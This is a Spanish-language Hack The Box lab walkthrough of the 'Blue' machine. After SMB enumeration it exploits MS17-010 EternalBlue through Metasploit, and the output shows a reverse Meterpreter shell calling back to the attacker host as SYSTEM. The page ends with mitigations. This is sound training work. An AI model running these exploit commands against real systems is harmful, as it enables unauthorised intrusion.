---
title: "HTB Walkthrough: Blue"
date: 2026-03-28
draft: false
description: "Walkthrough completo de la máquina Blue de Hack The Box. Dificultad Easy, OS Windows 7 SP1. Explotación de EternalBlue (MS17-010) mediante Metasploit para obtener acceso directo como NT AUTHORITY\\SYSTEM."
tags: ["HackTheBox", "Windows", "Easy", "EternalBlue", "MS17-010", "Metasploit", "SMB", "RCE", "blue", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Blue** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows 7 SP1**. El vector es el infame exploit **EternalBlue** (MS17-010), una vulnerabilidad en SMBv1 que compromete el kernel de Windows y entrega acceso directo como **NT AUTHORITY\SYSTEM** sin necesidad de credenciales.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                    |
|----------------|------------------------------------------------------------|
| **Nombre**     | Blue                                                       |
| **OS**         | Windows 7 Professional SP1 (x64)                          |
| **Dificultad** | Easy                                                       |
| **IP**         | 10.129.10.54                                               |
| **Técnicas**   | SMB Enumeration · EternalBlue · Kernel Exploit             |
| **CVE / MS**   | MS17-010 (CVE-2017-0144)                                   |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.54
```

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  msrpc
49153/tcp open  msrpc
49154/tcp open  msrpc
```

Escaneo de versiones sobre los puertos relevantes:

```bash
nmap -sC -sV -p135,139,445 10.129.10.54
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|_  System time: 2026-03-28T15:00:03+00:00
```

*Puertos abiertos:*
- `135, 139, 445` → Stack SMB/NetBIOS de Windows — patrón clásico de sistema Windows con recursos compartidos expuestos
- `49152+` → Puertos dinámicos RPC (Microsoft EPMAP)

> **💡 Dato clave:** El script `smb-os-discovery` confirma **Windows 7 Professional SP1 x64**. Esta versión es vulnerable a MS17-010 si no tiene el parche KB4012212 aplicado. El nombre de host `haris-PC` sugiere una máquina de escritorio, no un servidor hardened.

### 1.2 Enumeración SMB

Antes de explotar nada, enumeramos los recursos compartidos para entender la superficie expuesta:

```bash
smbclient -N -L //10.129.10.54
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk
Users           Disk
```

Los shares son visibles mediante null session (`-N`), pero `smbmap` confirma que no tenemos permisos de lectura ni escritura sin credenciales:

```bash
smbmap -H 10.129.10.54
```

```
[!] Access denied on 10.129.10.54, no fun for you...
```

Sin credenciales válidas no podemos acceder a los archivos. El único camino es explotar la vulnerabilidad del servicio en sí.

> **💡 Conclusiones:** SMBv1 activo, Windows 7 SP1 sin parchear, puerto 445 accesible. Todos los requisitos para MS17-010 están presentes.

---

## 2. Explotación — MS17-010 EternalBlue

### 2.1 Análisis de la Vulnerabilidad

**EternalBlue** es un exploit desarrollado por la NSA y filtrado públicamente por el grupo Shadow Brokers en abril de 2017. Explota un **desbordamiento de buffer en el pool no paginado del kernel de Windows** al procesar paquetes SMBv1 malformados.

```
Flujo normal:    paquete SMBv1 → srv.sys valida el buffer → procesa la petición
Flujo malicioso: paquete SMBv1 malformado → srv.sys no valida el tamaño → overflow en kernel
                 → inyección de shellcode → ejecución como SYSTEM
```

La razón por la que entregamos SYSTEM directamente es que `srv.sys` — el driver que gestiona SMB — corre en **modo kernel**. No hay necesidad de escalada de privilegios posterior. Si el puerto 445 es accesible y SMBv1 está habilitado, la máquina es vulnerable independientemente de las credenciales del atacante.

### 2.2 Configuración del Exploit en Metasploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.129.10.54
msf6 exploit(ms17_010_eternalblue) > set LHOST tun0
```

El módulo usa por defecto el payload `windows/x64/meterpreter/reverse_tcp`, adecuado para la arquitectura x64 del objetivo.

### 2.3 Ejecución

```bash
msf6 exploit(ms17_010_eternalblue) > run
```

```
[*] Started reverse TCP handler on 10.10.15.237:4444
[+] 10.129.10.54:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.129.10.54:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (244806 bytes) to 10.129.10.54
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.54:49158)
```

La línea `ETERNALBLUE overwrite completed successfully` confirma que el kernel ha sido comprometido y el stage de Meterpreter ha sido inyectado en memoria. Verificamos privilegios:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**NT AUTHORITY\SYSTEM** es el nivel de privilegio máximo en Windows, equivalente a `root` en Linux. No se requiere ningún paso adicional de escalada.

---

## 3. User Flag

```bash
meterpreter > cd C:\Users\haris\Desktop
meterpreter > cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 4. Root Flag

No hay escalada de privilegios — EternalBlue entrega SYSTEM directamente. Accedemos al escritorio del Administrador:

```bash
meterpreter > cd C:\Users\Administrator\Desktop
meterpreter > cat root.txt
```

> 🏁 Flag de root obtenida.

---

## 5. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Nmap + `smb-os-discovery` confirman Windows 7 SP1 x64 sin parchear con SMB expuesto.
2. **Enumeración SMB** → SMBv1 activo, null session visible pero sin acceso a archivos.
3. **MS17-010** → EternalBlue via Metasploit → desbordamiento en kernel → shell directa como **NT AUTHORITY\SYSTEM**.
4. **Flags** → Sin escalada necesaria, acceso directo a ambos escritorios → `user.txt` + `root.txt`.

**Lo que aprendí con esta máquina:**

- **La identificación precisa del SO es crítica en Windows.** La diferencia de versión, Service Pack y arquitectura puede determinar si un exploit funciona o no. El script `smb-os-discovery` de Nmap extrae esta información directamente del protocolo SMB sin necesidad de credenciales.

- **EternalBlue no requiere credenciales — solo acceso al puerto 445 con SMBv1 activo.** Es una vulnerabilidad de nivel de red que afecta al kernel directamente. Esto lo diferencia de la mayoría de exploits, que requieren algún tipo de autenticación previa.

- **Un exploit de nivel kernel entrega el máximo privilegio desde el primer momento.** En Windows, `srv.sys` corre en modo kernel, así que cualquier código inyectado a través de él hereda ese contexto — SYSTEM sin pasos adicionales. Esto muestra por qué las vulnerabilidades de kernel son las más graves.

- **EternalBlue fue el vector inicial de WannaCry y NotPetya.** Ambos ataques ocurrieron en 2017, semanas después de que el parche estuviera disponible, y afectaron a cientos de miles de sistemas. El tiempo entre la publicación de un parche y su aplicación masiva es la ventana que explotan los atacantes a escala global.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| MS17-010 sin parchear | Aplicar el boletín MS17-010 (KB4012212) — defensa más crítica contra este vector |
| SMBv1 habilitado | Deshabilitar SMBv1 completamente; usar únicamente SMBv2 o SMBv3 |
| Windows 7 sin soporte (EOL enero 2020) | Migrar a un SO con soporte activo (Windows 10/11 o Windows Server moderno) |
| Puerto 445 expuesto en la red | Segmentar la red y bloquear el 445 desde el exterior; aislar máquinas legacy en VLANs separadas |